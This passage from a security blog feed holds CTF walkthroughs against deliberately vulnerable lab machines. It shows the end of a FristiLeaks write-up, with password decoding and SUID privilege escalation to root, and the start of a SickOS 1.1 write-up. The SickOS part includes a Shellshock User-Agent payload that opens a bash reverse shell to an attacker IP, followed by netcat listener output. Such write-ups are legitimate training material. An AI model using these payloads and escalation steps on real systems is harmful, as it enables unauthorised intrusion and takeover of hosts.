&lt;span class=&quot;nt&quot;&gt;-rwxrwxrwx&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 admin     admin         18 Sep 22 12:40 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rwxrwxrwx&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 admin     admin        176 Sep 22 12:40 .bash_profile
&lt;span class=&quot;nt&quot;&gt;-rwxrwxrwx&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 admin     admin        124 Sep 22 12:40 .bashrc
&lt;span class=&quot;nt&quot;&gt;-rwxrwxrwx&lt;/span&gt;  1 admin     admin      45224 Nov 18 13:42 &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwxrwxrwx&lt;/span&gt;  1 admin     admin      48712 Nov 18 14:14 &lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwxrwxrwx&lt;/span&gt;  1 admin     admin        737 Nov 18 14:48 cronjob.py
&lt;span class=&quot;nt&quot;&gt;-rwxrwxrwx&lt;/span&gt;  1 admin     admin         21 Nov 18 15:21 cryptedpass.txt
&lt;span class=&quot;nt&quot;&gt;-rwxrwxrwx&lt;/span&gt;  1 admin     admin        258 Nov 18 15:20 cryptpass.py
&lt;span class=&quot;nt&quot;&gt;-rwxrwxrwx&lt;/span&gt;  1 admin     admin      90544 Nov 18 13:49 &lt;span class=&quot;nb&quot;&gt;df&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwxrwxrwx&lt;/span&gt;  1 admin     admin      24136 Nov 18 13:40 &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwxrwxrwx&lt;/span&gt;  1 admin     admin     163600 Nov 18 13:42 egrep
&lt;span class=&quot;nt&quot;&gt;-rwxrwxrwx&lt;/span&gt;  1 admin     admin     163600 Nov 18 13:42 &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwxrwxrwx&lt;/span&gt;  1 admin     admin      85304 Nov 18 13:41 ps
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 fristigod fristigod     25 Nov 19 01:47 whoisyourgodnow.txt
sh-4.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;whoisyourgodnow.txt
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;whoisyourgodnow.txt
&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;RFn0AKnlMHMPIzpyuTI0ITG
sh-4.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;cryptedpass.txt
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;cryptedpass.txt
mVGZ3O3omkJLmy2pcuTq&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The following python script appeared to create the above string in cryptedpass.txt:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;4.1&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cryptpass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cryptpass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;codecs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;encodeString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;base64string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;codecs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base64string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[::&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'rot13'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;cryptoResult&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encodeString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cryptoResult&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The above script was modified on the attacking machine to decode the string:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c1&quot;&gt;#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;codecs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;encodeString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;base64string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;codecs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base64string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[::&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'rot13'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decodeString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[::&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rot13&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decodeString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;String successfully decoded:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# python reverse.py &lt;span class=&quot;s2&quot;&gt;&quot;=RFn0AKnlMHMPIzpyuTI0ITG&quot;&lt;/span&gt;
LetThereBeFristi!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Using the previously decoded string it was possible to &lt;code&gt;su -&lt;/code&gt; to the user &lt;strong&gt;fristigod&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sh-4.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty;pty.spawn(&quot;/bin/sh&quot;)'&lt;/span&gt;
python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty;pty.spawn(&quot;/bin/sh&quot;)'&lt;/span&gt;
sh-4.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su - fristigod
su - fristigod
Password: LetThereBeFristi!

&lt;span class=&quot;nt&quot;&gt;-bash-4&lt;/span&gt;.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;502&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fristigod&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;502&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fristigod&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;502&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fristigod&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Enumeration as the user &lt;strong&gt;fristigod&lt;/strong&gt; revealed the SUID binary: &lt;code&gt;/var/fristigod/.secret_admin_stuff/doCom&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nt&quot;&gt;-bash-4&lt;/span&gt;.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /var/fristigod
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /var/fristigod
total 16
drwxr-x---   3 fristigod fristigod 4096 Nov 25 05:55 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x. 19 root      root      4096 Nov 19 01:41 ..
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;   1 fristigod fristigod  864 Nov 25 06:09 .bash_history
drwxrwxr-x.  2 fristigod fristigod 4096 Nov 25 05:53 .secret_admin_stuff
&lt;span class=&quot;nt&quot;&gt;-bash-4&lt;/span&gt;.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; .se
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; .secret_admin_stuff/
&lt;span class=&quot;nt&quot;&gt;-bash-4&lt;/span&gt;.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
ls
&lt;/span&gt;doCom
&lt;span class=&quot;nt&quot;&gt;-bash-4&lt;/span&gt;.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 16
drwxrwxr-x. 2 fristigod fristigod 4096 Nov 25 05:53 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-x---  3 fristigod fristigod 4096 Nov 25 05:55 ..
&lt;span class=&quot;nt&quot;&gt;-rwsr-sr-x&lt;/span&gt;  1 root      root      7529 Nov 25 05:53 doCom
&lt;span class=&quot;nt&quot;&gt;-bash-4&lt;/span&gt;.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./d
./doCom
Nice try, but wrong user &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;

&lt;p&gt;Execution of the doCom binary was possible using the user &lt;strong&gt;fristi&lt;/strong&gt; from the logged in user &lt;strong&gt;fristigod&lt;/strong&gt;, successfully escalating privileges.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; fristi .secret_admin_stuff/doCom /bin/sh
sh-4.1# &lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,502&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fristigod&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;fristileaks_secrets.txt
Congratulations on beating FristiLeaks 1.0 by Ar0xA &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;https://tldr.nu]

I wonder &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;you beat it &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the maximum 4 hours it&lt;span class=&quot;s1&quot;&gt;'s supposed to take!

Flag: Y0u_kn0w_y0u_l0ve_fr1st1&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Thanks for the VM :)&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>SickOS 1.1 - Walkthrough</title>
          <link>https://highon.coffee/blog/sickos-1-walkthrough/</link>
          <pubDate>Fri, 11 Dec 2015 11:00:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>CTF</category>
          
          
          <category>walkthroughs</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/sickos-1-walkthrough/</guid>
          <description>&lt;div class=&quot;coffee-rating&quot;&gt;
&lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;code&gt;Coffee Difficulty Rating:&lt;/code&gt;&lt;/p&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;/p&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#author-description&quot; id=&quot;markdown-toc-author-description&quot;&gt;Author Description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#host-enumeration&quot; id=&quot;markdown-toc-host-enumeration&quot;&gt;Host Enumeration&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#port-scanning&quot; id=&quot;markdown-toc-port-scanning&quot;&gt;Port Scanning&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#service-enumeration&quot; id=&quot;markdown-toc-service-enumeration&quot;&gt;Service Enumeration&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#squid-enumeration&quot; id=&quot;markdown-toc-squid-enumeration&quot;&gt;Squid Enumeration&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#nikto-scan-via-proxy&quot; id=&quot;markdown-toc-nikto-scan-via-proxy&quot;&gt;Nikto scan via Proxy&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#shellshock-bash-reverse-shell&quot; id=&quot;markdown-toc-shellshock-bash-reverse-shell&quot;&gt;Shellshock Bash Reverse Shell&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#local-enumeration&quot; id=&quot;markdown-toc-local-enumeration&quot;&gt;Local Enumeration&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#local-privilege-escalation&quot; id=&quot;markdown-toc-local-privilege-escalation&quot;&gt;Local Privilege Escalation&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#root-flag&quot; id=&quot;markdown-toc-root-flag&quot;&gt;Root Flag&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;author-description&quot;&gt;Author Description&lt;/h2&gt;

&lt;p&gt;This CTF gives a clear analogy how hacking strategies can be performed on a network to compromise it in a safe environment. This vm is very similar to labs I faced in OSCP. The objective being to compromise the network/machine and gain Administrative/root privileges on them.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; &lt;a href=&quot;https://twitter.com/D4rk36&quot;&gt;@D4rk36&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Download:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com&quot;&gt;VulnHub&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;host-enumeration&quot;&gt;Host Enumeration&lt;/h2&gt;

&lt;h3 id=&quot;port-scanning&quot;&gt;Port Scanning&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 1-65535 &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sT&lt;/span&gt; 192.168.30.138&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;service-enumeration&quot;&gt;Service Enumeration&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Version Detection&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 22&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;SSH&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 3128&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;HTTP-Proxy&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Squid http proxy 3.1.19&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

      &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;squid-enumeration&quot;&gt;Squid Enumeration&lt;/h2&gt;

&lt;p&gt;Inspection of Squid using the metasploit module &lt;code&gt;auxiliary/scanner/http/squid_pivot_scanning&lt;/code&gt; discovered port 80 was exposed via the proxy.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/sickos/metasploit-squid-pivot-scanning.png&quot; alt=&quot;Metasploit Squid Pivot Scanning&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;nikto-scan-via-proxy&quot;&gt;Nikto scan via Proxy&lt;/h2&gt;

&lt;p&gt;Nikto was configured to use the discovered Squid proxy:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# nikto &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 192.168.221.138 &lt;span class=&quot;nt&quot;&gt;-useproxy&lt;/span&gt; http://192.168.221.138:3128&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Nikto disclosed the location &lt;code&gt;/cgi-bin/status&lt;/code&gt;, indicating the target could be vulnerable to &lt;strong&gt;shellshock&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/sickos/nikto-proxy-scan.png&quot; alt=&quot;Nikto Proxy Scan&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;shellshock-bash-reverse-shell&quot;&gt;Shellshock Bash Reverse Shell&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Burp Suite&lt;/strong&gt; was used to manipulate &lt;code&gt;User-Agent:&lt;/code&gt; to include the bash reverse shell.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; ignored&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;/bin/bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/192.168.221.139/443 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/sickos/burp-shellshock-reverse-shell.png&quot; alt=&quot;Burp Suite Shellshock Reverse Bash Shell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A reverse shell was established:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# nc.traditional &lt;span class=&quot;nt&quot;&gt;-lp&lt;/span&gt; 443 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt;
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...

192.168.221.138: inverse host lookup failed: Unknown host
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.221.139] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.221.138] 59815
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
www-data@SickOs:/usr/lib/cgi-bin&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;local-enumeration&quot;&gt;Local Enumeration&lt;/h2&gt;

&lt;p&gt;Local enumeration of the system disclosed the file &lt;code&gt;/var/www/wolfcms/config.php&lt;/code&gt; containing:&lt;/p&gt;

